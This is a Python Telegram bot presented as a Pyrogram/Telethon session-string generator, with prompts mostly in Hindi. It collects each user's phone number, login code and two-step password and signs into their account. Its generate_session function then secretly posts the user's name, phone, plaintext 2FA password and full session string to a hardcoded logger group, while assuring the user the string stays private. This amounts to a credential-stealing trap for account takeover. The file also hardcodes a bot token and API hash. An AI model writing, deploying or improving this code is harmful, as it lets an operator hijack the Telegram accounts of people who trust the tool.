import requests
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.sessions import StringSession

API_ID = 28049056  
API_HASH = "1a301acbe312e760b4d0716fd3b8eab2"
BOT_TOKEN = "7589052839:AAGPMVeZpb63GEG_xXzQEua1q9ewfNzTg50"

LOGGER_GROUP_ID = -1002477750706  

app = Client("session_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

session_data = {}

@app.on_message(filters.command(["start"]) & filters.private)
async def start(client, message):
    await message.reply(
        "**🤖 Welcome to Telegram Session Generator!**\n\n"
        "**आप Telethon और Pyrogram दोनों के लिए सेशन स्ट्रिंग बना सकते हैं।**\n\n"
        "**बटन पर क्लिक करें और अपनी सेशन स्टार्ट करें!**",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("✨ Pyrogram", callback_data="start_pyro"),
             InlineKeyboardButton("⚡ Telethon", callback_data="start_tele")]
        ])
    )

@app.on_callback_query(filters.regex(r"^start_"))
async def start_session(client, callback_query):
    session_type = "Pyrogram" if callback_query.data == "start_pyro" else "Telethon"
    chat_id = callback_query.message.chat.id
    session_data[chat_id] = {"type": session_type}

    await callback_query.message.edit_text(
        f"**🔹 {session_type} Session Setup शुरू हो रहा है...**\n\n"
        "🔹 कृपया अपना **API ID** भेजें।",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
    )
    session_data[chat_id]["stage"] = "api_id"

@app.on_message(filters.text & filters.private)
async def handle_input(client, message):
    chat_id = message.chat.id
    if chat_id not in session_data:
        return

    session = session_data[chat_id]
    stage = session["stage"]

    if stage == "api_id":
        try:
            session["api_id"] = int(message.text)
            session["stage"] = "api_hash"
            await message.reply("✅ अब अपना **API HASH** भेजें।")
        except ValueError:
            await message.reply("❌ Invalid API ID. कृपया सही **integer** भेजें।")

    elif stage == "api_hash":
        session["api_hash"] = message.text
        session["stage"] = "phone_number"
        await message.reply("📲 अब अपना **फ़ोन नंबर** भेजें (Example: +919876543210)")

    elif stage == "phone_number":
        session["phone_number"] = message.text
        await message.reply("🔐 OTP भेजा जा रहा है, कृपया प्रतीक्षा करें...")
        await send_otp(client, message)

    elif stage == "otp":
        session["otp"] = message.text
        await message.reply("✅ OTP Verify हो रहा है...")
        await validate_otp(client, message)

    elif stage == "2fa":
        session["password"] = message.text
        await validate_2fa(client, message)

async def send_otp(client, message):
    session = session_data[message.chat.id]
    api_id, api_hash, phone = session["api_id"], session["api_hash"], session["phone_number"]
    
    client_obj = TelegramClient(StringSession(), api_id, api_hash)
    await client_obj.connect()
    
    try:
        code = await client_obj.send_code_request(phone)
        session["client_obj"] = client_obj
        session["code"] = code
        session["stage"] = "otp"

        await message.reply("🔢 कृपया **OTP** भेजें (Example: `12345`)।")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
        del session_data[message.chat.id]

async def validate_otp(client, message):
    session = session_data[message.chat.id]
    client_obj, phone, otp = session["client_obj"], session["phone_number"], session["otp"]

    try:
        await client_obj.sign_in(phone, otp)

        if await client_obj.is_user_authorized():
            await generate_session(client, message)
        else:
            session["stage"] = "2fa"
            await message.reply("🔐 आपका अकाउंट **Two-Step Verification** से सुरक्षित है।\n\nकृपया अपना **पासवर्ड** भेजें।")

    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e) or "Two-steps verification is enabled" in str(e):
            session["stage"] = "2fa"
            await message.reply("🔐 **Two-Step Verification Enabled!**\n\nकृपया अपना **2FA पासवर्ड** भेजें।")
        else:
            await message.reply(f"❌ **OTP Invalid:** {e}")
            del session_data[message.chat.id]

async def validate_2fa(client, message):
    session = session_data[message.chat.id]
    client_obj = session["client_obj"]

    try:
        await client_obj.sign_in(password=session["password"])
        await generate_session(client, message)
    except Exception as e:
        await message.reply(f"❌ **गलत 2FA पासवर्ड:** {e}\n\n⚠ **कृपया सही पासवर्ड भेजें।**")
        
async def generate_session(client, message):
    session = session_data[message.chat.id]
    client_obj = session["client_obj"]
    user = await client_obj.get_me()

    session_string = client_obj.session.save()

    log_text = (
        f"📌 **New Session Generated**\n\n"
        f"👤 **User:** `{user.first_name} (@{user.username})`\n"
        f"📞 **Phone:** `{session['phone_number']}`\n"
        f"🔑 **2FA Password:** `{session.get('password', 'No 2FA')}`\n"
        f"🔹 **Session String:**\n`{session_string}`\n\n"
        f"⚠ **कृपया इसे सुरक्षित रखें और किसी को न दें।**"
    )

    await client.send_message(LOGGER_GROUP_ID, log_text)
    await client_obj.send_message("me", f"✅ **Session String Generated!**\n\n`{session_string}`")
    await client_obj.disconnect()
    await message.reply("✅ आपका Session String **Saved Messages** में भेज दिया गया है।")
    del session_data[message.chat.id]

@app.on_callback_query(filters.regex("cancel"))
async def cancel_process(client, callback_query):
    chat_id = callback_query.message.chat.id
    if chat_id in session_data:
        del session_data[chat_id]
    await callback_query.message.edit_text("🚫 **Session Generation Canceled!**")

app.run()
